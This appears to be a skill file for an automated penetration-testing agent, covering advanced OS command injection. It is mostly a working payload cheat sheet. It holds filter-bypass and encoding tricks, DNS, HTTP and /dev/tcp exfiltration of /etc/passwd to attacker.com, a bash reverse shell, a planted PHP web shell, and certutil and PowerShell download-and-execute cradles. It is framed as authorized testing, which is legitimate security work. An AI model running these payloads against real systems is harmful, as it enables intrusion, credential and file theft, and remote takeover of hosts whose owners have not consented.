---
name: command-injection-advanced
description: "Advanced command injection with filter bypass, encoding tricks, OOB exfiltration, and polyglot payloads"
category: specialized
tier: powerful
toolRefs: [httpRequest, parseResponse, measureTiming, compareResponses, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["advanced command injection", "command injection bypass", "os command injection", "rce injection", "shell injection", "command filter bypass", "blind command injection", "out of band command", "polyglot injection", "code injection"]
contextBoosts: [sqli]
mitreAttack: ["T1059", "T1059.004", "T1190"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP OS Command Injection"]
---

# Advanced Command Injection

## When to Use

- Input is passed to a system shell, exec, system, popen, or similar OS-level execution functions
- Application performs file operations, network calls, or system tasks based on user-controlled parameters
- Blind injection points where output is not directly returned but side effects (timing, DNS, file writes) are observable
- WAF or input filters are in place and standard payloads are blocked
- Target environment runs PHP, Java, Python, Node.js, or any language that interfaces with the OS shell
- Time-based or out-of-band detection is the only viable confirmation method
- You need to bypass allowlists, blocklists, or regex-based input sanitization

## Do Not Use

- Input is handled purely by language-level interpreters (SQL, template engines, JSON parsers) without OS shell invocation
- Target is a static site or fully sandboxed container with no shell access
- Injection point only affects client-side JavaScript execution
- You have not confirmed the input reaches a command execution sink (avoid guessing)
- Destructive payloads against production systems without explicit authorization

## Auth Context

Before any injection test, call `getCapturedHeaders` to retrieve session tokens, CSRF tokens, and authentication headers. Command injection in authenticated contexts may produce different output or require valid session state to reach the execution sink. Replay captured cookies and authorization headers with every probe request. Authenticated injection points often have stricter filtering — document the auth requirement for each finding.

## Filter Bypass Techniques

### IFS Bypass

The Internal Field Separator (`$IFS`) acts as whitespace in bash when spaces are filtered:

```
cat${IFS}/etc/passwd
ls${IFS}-la${IFS}/tmp
who${IFS}ami
ping${IFS}-c${IFS}1${IFS}127.0.0.1
```

Alternative IFS values:

```
cat$IFS'/'etc'/'passwd
cat${IFS}<'/etc/passwd'
ls${IFS}$'\x2d'la
```

### Hex Encoding

Bypass character filters using hex-encoded command strings:

```
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
`printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
/bin/bash -e <<< $(echo "636174202f6574632f706173737764" | xxd -r -p)
```

### Octal Encoding

```
$(printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144")
`printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144"`
```

### Wildcards

Use glob wildcards to construct commands without using the actual characters:

```
/?in/?d            → /bin/id
/???/??t ???/???s*  → /cat /etc/passwd (limited)
cat /etc/p?sswd
cat /etc/p[abc]sswd
ls /b?n/id
/b?n/sh -c "id"
```

### Brace Expansion

Bash brace expansion bypasses space and keyword filters:

```
{cat,/etc/passwd}
{ls,-la,/tmp}
{ping,-c,1,127.0.0.1}
{wget,http://evil.com/shell.sh}
```

Combined with IFS:

```
{cat,$IFS/etc/passwd}
{ls,$IFS-la}
```

### Null Byte Injection

Null bytes may truncate strings in certain parsers while passing validation:

```
cat%00/etc/passwd
id%00
/bin/ca%74/etc/passwd
```

PHP-specific null byte handling:

```
id%00;id
id\x00||id
```

## Blind Exfiltration Techniques

### DNS Exfiltration

When no output is returned, exfiltrate data via DNS queries:

**Linux:**
```
cat /etc/passwd | base64 | tr -d '\n' | sed 's/.\{63\}/&./g' | while read line; do nslookup "$line.attacker.com"; done
```

**Simplified DNS leak:**
```
host $(whoami).attacker.com
nslookup $(whoami).attacker.com
dig $(whoami).attacker.com
```

**PHP-specific:**
```
php -r "system('nslookup '.base64_encode(file_get_contents('/etc/passwd')).'.attacker.com');"
```

### HTTP Exfiltration

Exfiltrate data via HTTP requests to an external server:

**Using curl:**
```
curl http://attacker.com/$(cat /etc/passwd | base64 | tr -d '\n')
curl -d "$(cat /etc/passwd)" http://attacker.com/exfil
wget "http://attacker.com/$(whoami)"
```

**Using Python:**
```
python -c "import urllib.request; urllib.request.urlopen('http://attacker.com/'+__import__('os').popen('id').read())"
```

**Using Node.js:**
```
node -e "require('http').get('http://attacker.com/'+require('child_process').execSync('id'))"
```

### File-Based Exfiltration

Write output to a file that can be retrieved through a web-accessible directory:

```
id > /var/www/html/shell-output.txt
whoami > /tmp/output.txt
cat /etc/passwd > /var/www/uploads/output.txt
```

Combined with web server access:

```
echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php
curl http://target/shell.php?cmd=id
```

## Time-Based Detection

When no output channel exists, use timing to confirm injection:

### Sleep-Based

```
sleep 5
sleep${IFS}5
{sleep,5}
ping -c 5 127.0.0.1
ping -n 5 127.0.0.1
```

### Conditional Timing

Only sleep if a condition is true:

```
[ $(whoami) = "root" ] && sleep 5
test $(id -u) -eq 0 && sleep 5
if [ -f /etc/shadow ]; then sleep 5; fi
```

### Timing-Based Data Extraction

Extract data bit by bit using timing:

```
if [ "$(cat /etc/passwd | head -1 | cut -c1)" = "r" ]; then sleep 5; fi
```

### /dev/tcp Blind Channel

Bash `/dev/tcp` for blind data transfer:

```
cat /etc/passwd > /dev/tcp/attacker.com/4444
id > /dev/tcp/attacker.com/4444
```

Reverse shell via `/dev/tcp`:

```
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

## Encoding Techniques

### Hex Encoding

```
echo -e "\x69\x64"                    → id
printf "\x69\x64"                     → id
/bin/bash -c $'\x69\x64'
```

### Octal Encoding

```
echo -e "\151\144"                    → id
printf "\151\144"                     → id
```

### Unicode Encoding

```
echo -e "\u0069\u0064"                → id
printf '\u0069\u0064'
```

### Base64 Encoding

```
echo aWQ= | base64 -d | bash          → id
bash -c $(echo aWQ= | base64 -d)
/bin/bash -e <<< $(echo aWQ= | base64 -d)
```

### Subshell / Command Substitution

```
$(id)
`id`
$(whoami)
$(cat /etc/passwd)
$(curl http://attacker.com/$(whoami))
```

### Variable Expansion

```
a=i;b=d;$a$b
x=whoami;${x}
cmd=id;${cmd}
```

### Arithmetic Expansion

```
$((64+8))    → 72 (not useful alone, but bypasses digit filters in some contexts)
```

## Alternative Delimiters

Different shells and execution contexts support various command separators:

| Delimiter | Example | Notes |
|-----------|---------|-------|
| Backticks | `` `id` `` | Universal in bash/sh |
| `$()` | `$(id)` | Modern shell substitution |
| `${}` | `${cmd}` | Variable expansion context |
| `\|` (pipe) | `ls \| id` | Output piped to next command |
| `\|\|` (OR) | `id \|\| true` | Execute if previous fails |
| `&&` (AND) | `id && whoami` | Execute if previous succeeds |
| `;` (semicolon) | `id; whoami` | Sequential execution |
| Newline | `id%0a whoami` | URL-encoded newline |
| `%0d%0a` | `id%0d%0awhoami` | CRLF injection |
| `{}` | `{id,whoami}` | Brace expansion |
| `<>` | `</etc/passwd` | Redirect (limited) |
| `&` | `id&` | Background execution |

### Newline Injection

URL-encoded newline to inject new commands:

```
id%0acat /etc/passwd
id%0d%0acat /etc/passwd
id%0a./shell.sh
```

### Pipe Chains

```
id | base64
cat /etc/passwd | base64 | tr -d '\n'
whoami | curl -d @- http://attacker.com/
```

## OS-Specific Differences

### Linux

- Uses `/bin/sh`, `/bin/bash`, or `/bin/dash`
- File paths: `/etc/passwd`, `/etc/shadow`, `/tmp`
- Commands: `id`, `whoami`, `cat`, `ls`, `wget`, `curl`, `nc`
- Wildcards: `?`, `*`, `[a-z]`
- Null bytes: often ineffective (kernel rejects)
- Process substitution: `<()`, `>()`
- `/dev/tcp` available in bash

### Windows

- Uses `cmd.exe`, `powershell.exe`, or `pwsh`
- File paths: `C:\Windows\System32`, `C:\Users`, `C:\temp`
- Commands: `whoami`, `dir`, `type`, `powershell`, `certutil`
- Wildcards: `?`, `*`
- Null bytes: may truncate strings in some contexts
- Environment variables: `%PATH%`, `%TEMP%`
- Pipe and redirect: same as Linux but with `findstr` instead of `grep`

**Windows-specific bypasses:**
```
powershell -e <base64>
cmd /c "whoami"
cmd.exe /c "type C:\Windows\System32\drivers\etc\hosts"
certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe
```

### PowerShell Encoding

```
powershell -EncodedCommand <base64>
powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')
```

## Polyglot Payloads

Payloads designed to execute across multiple injection contexts:

### Multi-Context Polyglot

```
;id;`id`;$(id)|id&&id||id
```

Works with: semicolons, backticks, subshell, pipes, logical operators.

### SQL + Command Injection Polyglot

```
1' OR 1=1; system('id'); //
```

### XSS + Command Injection Polyglot

```
"><script>alert(1)</script>$(id)
```

### Template + Command Injection Polyglot

```
{{7*7}}$(id)${7*7}
```

### Universal Blind Polyglot

```
;sleep 5;`sleep 5`;$(sleep 5)|sleep 5&&sleep 5||sleep 5
```

Detects which delimiter the target processes by timing each variant.

## Anti-Hallucination

### Verification Protocol

1. **Command execution claims require output evidence** — `id` must produce `uid=`, `gid=`, or `groups=` in the response body
2. **Blind injection claims require side-effect evidence** — timing data, DNS callback, file write, or HTTP exfil must be observed
3. **Filter bypass claims require comparison** — show the blocked payload fails AND the bypass payload succeeds on the same endpoint
4. **Encoding claims require decoded verification** — show the encoded payload and confirm the decoded command executed
5. **File read claims require file content** — partial or full file content must appear in the response
6. **OS-specific claims require OS identification** — confirm the target OS before claiming Linux vs Windows differences
7. **Time-based claims require measurement** — document exact timing; if `sleep 5` does not cause a 5+ second delay, the payload did not execute
8. **Polyglot claims require multi-context proof** — demonstrate the payload works in more than one injection context
9. **Do not infer shell type from URL structure** — `/api/run` does not guarantee bash; confirm with `echo $0` or similar
10. **Document every request-response pair** — include the exact payload, the exact response, and the timing data

### Evidence Recording

For every confirmed command injection finding, record via `writeFinding`:
- **Endpoint**: Full URL, parameter name, and HTTP method
- **Payload**: Exact string injected (raw, not encoded)
- **Shell**: Identified shell or execution context with evidence
- **Filter bypass**: Whether WAF/filter was present and how it was bypassed
- **Exfiltration method**: Direct output, blind timing, DNS, HTTP, or file-based
- **OS**: Confirmed target operating system
- **Impact**: RCE, file read, file write, reverse shell, or data exfiltration
- **Request/Response**: Full HTTP exchange via `recordEvidence`
- **Timing**: If time-based, include request start, end, and delta
